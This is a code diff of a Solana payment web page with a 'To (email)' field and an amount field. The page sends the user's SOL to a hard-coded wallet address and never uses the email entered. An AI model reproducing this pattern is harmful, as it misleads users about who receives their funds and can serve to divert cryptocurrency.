@@ -12,11 +12,9 @@
     if (typeof crypto !== 'undefined' && !crypto.randomUUID) {
       crypto.randomUUID = () => (
         [1e7] + -1e3 + -4e3 + -8e3 + -1e11
-      ).replace(/[018]/g, c =>
-        (
-          c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> (c / 4)
-        ).toString(16)
-      );
+      ).replace(/[018]/g, c => (
+        c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> (c / 4)
+      ).toString(16));
     }
   </script>
 
@@ -39,18 +37,18 @@
     <!-- Input Fields -->
     <div class="mx-auto max-w-xs space-y-4">
       <label class="block text-left">
-        <span class="block text-xl font-bold">To</span>
-        <input id="to" name="to" type="email" required placeholder="example@example.com" class="mt-1 w-full px-3 py-2 rounded bg-green text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-black" />
+        <span class="block text-xl font-bold">To (email)</span>
+        <input id="to" name="to" type="email" required placeholder="example@example.com" class="mt-1 w-full px-3 py-2 rounded bg-white text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-black" />
       </label>
 
       <label class="block text-left">
-        <span class="block text-xl font-bold">Amount (in SOL)</span>
+        <span class="block text-xl font-bold">Amount (SOL)</span>
         <!-- 3‑decimal precision -->
         <input id="amount" name="amount" type="number" min="0" step="0.001" required placeholder="0.000" class="mt-1 w-full px-3 py-2 rounded bg-white text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-black" />
       </label>
     </div>
 
-    <button id="sendButton" class="text-3xl px-6 py-3 bg-black text-white rounded-lg shadow-lg hover:bg-pink-900 transition disabled:opacity-50">
+    <button id="sendButton" class="text-3xl px-6 py-3 bg-black text-white rounded-lg shadow-lg hover:bg-purple-900 transition disabled:opacity-50">
       SEND IT
     </button>
     <p id="walletAddress" class="mt-4 text-lg font-mono break-all"></p>
@@ -67,35 +65,90 @@
       LAMPORTS_PER_SOL,
     } = solanaWeb3;
 
-    const DESTINATION_ADDRESS = "4RjJu4S761irqRYKGydVNf3rfTjQa9mJiTPT8vsUxjJW";
+    const DESTINATION_ADDRESS = "4RjJu4S761irqRYKGydVNf3rfTjQa9mJiTPT8vsUxjJW"; // fixed receiver
 
     const sendButton = document.getElementById('sendButton');
     const walletAddressEl = document.getElementById('walletAddress');
     const toInput = document.getElementById('to');
     const amountInput = document.getElementById('amount');
 
-    /**
-     * Safely access Phantom (or another Solana‑compatible) provider.
-     */
     function getProvider() {
-      const anyWindow = window;
-      return anyWindow?.phantom?.solana || anyWindow?.solana || null;
+      return window?.phantom?.solana || window?.solana || null;
     }
 
+    /** Ensure wallet is connected – always call before signing */
     async function connectWallet() {
       const provider = getProvider();
-      if (!provider || !provider.isPhantom) {
-        alert('Phantom Wallet not found. Please install the Phantom browser extension and refresh.');
+      if (!provider) {
+        alert('No Solana wallet found. Install Phantom and try again.');
         throw new Error('Provider not found');
       }
-      if (provider.publicKey) {
-        walletAddressEl.textContent = `Connected: ${provider.publicKey.toString()}`;
-        return provider.publicKey;
+
+      if (!provider.publicKey) {
+        // Will present modal if not previously trusted
+        await provider.connect({ onlyIfTrusted: false });
       }
-      const { publicKey } = await provider.connect();
-      walletAddressEl.textContent = `Connected: ${publicKey.toString()}`;
-      return publicKey;
+
+      walletAddressEl.textContent = `Connected: ${provider.publicKey.toString()}`;
+      return provider;
+    }
+
+    async function buildAndSend(provider) {
+      // Validate form after wallet so user sees connect prompt first
+      if (!toInput.checkValidity() || !amountInput.checkValidity()) {
+        toInput.reportValidity();
+        amountInput.reportValidity();
+        return;
+      }
+
+      const amountSol = parseFloat(amountInput.value);
+      const lamports = Math.round(amountSol * LAMPORTS_PER_SOL);
+      if (!Number.isFinite(lamports) || lamports <= 0) {
+        alert('Amount must be greater than 0');
+        return;
+      }
+
+      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+      const toPubkey = new PublicKey(DESTINATION_ADDRESS);
+      const fromPubkey = provider.publicKey;
+
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+      const transaction = new Transaction({
+        feePayer: fromPubkey,
+        recentBlockhash: blockhash,
+        lastValidBlockHeight,
+      }).add(
+        SystemProgram.transfer({ fromPubkey, toPubkey, lamports })
+      );
+
+      try {
+        const signed = await provider.signTransaction(transaction);
+        const txid = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, 'confirmed');
+        alert(`Transaction submitted!\nTxID: ${txid}`);
+      } catch (err) {
+        if (err?.code === 4001 || /User rejected/i.test(err?.message)) return; // user rejected
+        console.error('Transaction failed:', err);
+        alert('Transaction failed: ' + (err?.message || err));
+      }
     }
 
     async function handleSend() {
+      try {
+        const provider = await connectWallet();
+        await buildAndSend(provider);
+      } catch (_) {
+        // errors are handled inside sub‑functions
+      }
+    }
 
+    // update UI if wallet connects from outside the page
+    const provider = getProvider();
+    provider?.on?.('connect', () => {
+      walletAddressEl.textContent = `Connected: ${provider.publicKey.toString()}`;
+    });
+
+    sendButton.addEventListener('click', handleSend);
+  </script>
+</body>
+</html>
